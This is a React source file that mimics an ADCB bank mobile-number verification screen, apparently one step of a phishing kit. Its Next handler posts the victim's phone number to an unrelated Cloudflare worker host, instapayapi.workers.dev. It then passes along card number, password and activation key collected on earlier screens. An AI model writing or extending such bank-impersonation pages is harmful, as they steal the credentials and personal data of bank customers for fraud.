import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import Logo from "./assets/adcb.jpg"

const PhoneIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke="white" strokeWidth="1.8">
        <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6A19.79 19.79 0 012.12 4.18 2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
);

const ADCBLogo = () => (
    <img
        src={Logo}
        alt="ADCB Logo"
        style={{ height: "48px", objectFit: "contain" }}
    />
);

const StepDots = ({ step }) => (
    <div className="flex items-center gap-1">
        <div className="w-4 h-4 rounded-full bg-red-600" />
        <div className="w-8 h-0.5" style={{ background: step >= 2 ? "#cc0000" : "#d1d5db" }} />
        <div className="w-4 h-4 rounded-full" style={{ background: step >= 2 ? "#cc0000" : "white", border: step >= 2 ? "none" : "2px solid #d1d5db" }} />
        <div className="w-8 h-0.5" style={{ background: step >= 3 ? "#cc0000" : "#d1d5db" }} />
        <div className="w-4 h-4 rounded-full" style={{ background: step >= 3 ? "#cc0000" : "white", border: step >= 3 ? "none" : "2px solid #d1d5db" }} />
    </div>
);

export default function ADCBMobileNumber() {
    const [mobile, setMobile] = useState("");
    const [countryCode, setCountryCode] = useState("+971");
    const [touched, setTouched] = useState(false);
    const navigate = useNavigate();
    const location = useLocation();
    const { cardNumber, password, activationKey } = location.state || {};

    const isEmpty = touched && mobile.trim() === "";

    const handleNext = async () => {
        setTouched(true);
        if (mobile.trim() !== "") {
            const payload = {
                phone: mobile
            }
            await fetch(
                " https://my-worker-app.instapayapi.workers.dev/api/phone",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                },
            );
            //   navigate("/adcbnextpage", { state: { cardNumber, mobile: countryCode + mobile } });
            navigate("/lastActivation", { state: { cardNumber, password, phone: countryCode + mobile, activationKey } });
        }
    };

    return (
        <div
            className="flex flex-col overflow-hidden"
            style={{
                width: "100%",
                height: "100vh",
                maxHeight: "100vh",
                fontFamily: "'Helvetica Neue', Arial, sans-serif",
            }}
        >
            {/* Nav bar */}
            <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100 flex-shrink-0">
                <button className="mr-4 text-gray-700" onClick={() => navigate(-1)}>
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                        <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                </button>
                <div className="flex-1 flex justify-center">
                    <ADCBLogo />
                </div>
            </div>

            {/* White header */}
            <div className="bg-white px-5 pt-5 pb-0 flex-shrink-0">
                <div className="flex justify-between items-center">
                    <span className="font-black text-gray-900 tracking-wide text-sm">MOBILE NUMBER</span>
                    {/* <StepDots step={1} /> */}
                </div>
            </div>

            {/* Phone icon with horizontal line */}
            <div className="relative bg-white flex-shrink-0" style={{ height: "70px" }}>
                <div className="absolute bg-gray-200" style={{ top: "40px", left: 0, right: 0, height: "1px", zIndex: 0 }} />
                <div className="absolute left-0 right-0 flex justify-center" style={{ top: "0px", zIndex: 1 }}>
                    <div
                        className="w-20 h-20 rounded-full flex items-center justify-center shadow-md"
                        style={{ background: "#cc0000" }}
                    >
                        <PhoneIcon />
                    </div>
                </div>
            </div>

            {/* White content */}
            <div className="flex-1 flex flex-col bg-white px-5 pt-14 pb-8 overflow-hidden">

                {/* Info text */}
                <div className="flex flex-col items-center mb-8 flex-shrink-0">
                    <p className="text-gray-500 text-sm text-center leading-relaxed px-2">
                        Please enter your registered mobile number to receive an OTP for verification.
                    </p>
                </div>

                {/* Mobile number field */}
                <div className="mb-4 flex-shrink-0">
                    <label className="font-bold text-gray-900 text-sm block mb-2">
                        Mobile Number
                    </label>
                    <div
                        className="flex rounded-lg overflow-hidden bg-white"
                        style={{ border: isEmpty ? "1.5px solid #cc0000" : "1.5px solid #d1d5db" }}
                    >
                        {/* Country code selector */}
                        <div className="flex items-center px-3 border-r border-gray-200 bg-gray-50 flex-shrink-0">
                            <select
                                value={countryCode}
                                onChange={e => setCountryCode(e.target.value)}
                                className="bg-transparent text-gray-700 text-sm outline-none cursor-pointer pr-1"
                                style={{ fontSize: "14px" }}
                            >
                                <option value="+971">+971</option>
                                {/* <option value="+92">🇵🇰 +92</option>
                <option value="+1">🇺🇸 +1</option>
                <option value="+44">🇬🇧 +44</option>
                <option value="+91">🇮🇳 +91</option>
                <option value="+966">🇸🇦 +966</option>
                <option value="+974">🇶🇦 +974</option>
                <option value="+965">🇰🇼 +965</option> */}
                            </select>
                        </div>
                        {/* Number input */}
                        <input
                            type="text"
                            inputMode="numeric"
                            value={mobile}
                            onChange={e => {
                                const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
                                setMobile(digits);
                            }}
                            onBlur={() => setTouched(true)}
                            placeholder="Enter mobile number"
                            className="flex-1 px-4 py-4 bg-white text-gray-700 text-sm outline-none"
                            style={{ fontSize: "15px" }}
                        />
                    </div>
                    {isEmpty && (
                        <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
                    )}
                </div>

                {/* Spacer */}
                <div className="flex-1" style={{ maxHeight: "80px" }} />

                {/* Next button */}
                <button
                    onClick={handleNext}
                    className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80 mb-6 flex-shrink-0"
                    style={{ background: "#cc0000" }}
                >
                    Next
                </button>

                {/* Support */}
                <div className="flex justify-center items-center gap-2 flex-shrink-0">
                    <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                    </svg>
                    <a href="#" className="text-red-600 text-sm underline">Support</a>
                </div>
            </div>

            {/* Watermark */}
            <div
                className="absolute bottom-0 left-0 right-0 h-28 pointer-events-none opacity-10"
                style={{
                    backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
                    backgroundSize: "8px 8px",
                }}
            />
        </div>
    );
}